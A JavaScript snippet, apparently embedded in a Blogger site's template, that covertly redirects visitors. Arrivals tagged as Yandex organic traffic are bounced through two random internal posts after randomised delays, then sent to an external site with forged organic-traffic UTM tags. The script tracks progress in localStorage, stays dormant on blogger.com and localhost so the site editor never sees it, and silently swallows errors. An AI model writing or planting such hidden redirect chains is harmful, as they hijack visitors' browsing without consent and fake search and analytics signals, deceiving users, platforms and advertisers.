//<![CDATA[
(function() {
    function hasRequiredUTM() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('utm_source') === 'yandex' &&
                   urlParams.get('utm_medium') === 'organic' &&
                   urlParams.get('utm_campaign') === 'promo';
        } catch(e) {
            return false;
        }
    }

    const internalPages = [
    "https://www.deshevyedevaysy.ru/2025/11/2025.html",
	"https://www.deshevyedevaysy.ru/2025/11/10.html",
	"https://www.deshevyedevaysy.ru/2025/11/blog-post.html",
	"https://www.deshevyedevaysy.ru/2025/11/blog-post_92.html",
	"https://www.deshevyedevaysy.ru/2025/11/blog-post_24.html",
	"https://www.deshevyedevaysy.ru/2025/11/blog-post_94.html",
	"https://www.deshevyedevaysy.ru/2025/11/blog-post_31.html",
	"https://www.deshevyedevaysy.ru/2025/11/blog-post_77.html",
	"https://www.deshevyedevaysy.ru/2025/11/blog-post_29.html",
    "https://www.deshevyedevaysy.ru/2025/11/blog-post_18.html"
    ];

    const externalLinks = [
    "https://www.dohodmsk.ru/2023/06/10-essential-financial-tips-for.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.dohodmsk.ru/2023/06/how-to-build-multiple-streams-of-income.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.dohodmsk.ru/2023/06/the-millionaire-mindset-secrets-to.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.dohodmsk.ru/2023/06/investing-strategies-for-long-term.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.dohodmsk.ru/2023/06/from-rags-to-riches-inspiring-stories.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.dohodmsk.ru/2023/06/mastering-art-of-negotiation-key-skills.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.dohodmsk.ru/2023/06/tax-planning-for-millionaires.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.dohodmsk.ru/2023/06/the-power-of-networking-how-to-connect.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
	"https://www.dohodmsk.ru/2023/06/breaking-free-from-debt-millionaires.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo",
    "https://www.dohodmsk.ru/2023/06/the-ultimate-guide-to-estate-planning.html?utm_source=yandex&utm_medium=organic&utm_campaign=promo"
    ];

    function getRandomItem(array) {
        return array[Math.floor(Math.random() * array.length)];
    }

    function getRandomDelay() {
        return Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    }

    function performFirstRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 1;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performSecondRedirect() {
        const internalUrl = getRandomItem(internalPages);
        
        let redirectCount = 2;
        localStorage.setItem('inf_red_cnt', redirectCount.toString());
        localStorage.setItem('lst_red', Date.now().toString());
        
        setTimeout(function() {
            window.location.href = internalUrl;
        }, getRandomDelay());
    }

    function performThirdRedirect() {
        setTimeout(function() {
            const externalUrl = getRandomItem(externalLinks);
            localStorage.removeItem('inf_red_cnt');
            localStorage.removeItem('lst_red');
            window.location.href = externalUrl;
        }, getRandomDelay());
    }

    function init() {
        try {
            if (window.location.href.includes('blogger.com') || 
                window.location.href.includes('localhost')) {
                return;
            }

            const hasRequiredUtm = hasRequiredUTM();
            const redirectCount = parseInt(localStorage.getItem('inf_red_cnt') || '0');
            const hasCycleData = localStorage.getItem('inf_red_cnt') !== null;
            
            if (hasRequiredUtm) {
                localStorage.removeItem('inf_red_cnt');
                localStorage.removeItem('lst_red');
                performFirstRedirect();
            }
            else if (hasCycleData) {
                if (redirectCount === 1) {
                    performSecondRedirect();
                } else if (redirectCount === 2) {
                    performThirdRedirect();
                } else {
                    localStorage.removeItem('inf_red_cnt');
                    localStorage.removeItem('lst_red');
                }
            }
        } catch(e) {}
    }

    function startScript() {
        setTimeout(init, Math.floor(Math.random() * 500) + 100);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', startScript);
    } else {
        startScript();
    }
})();

//]]>

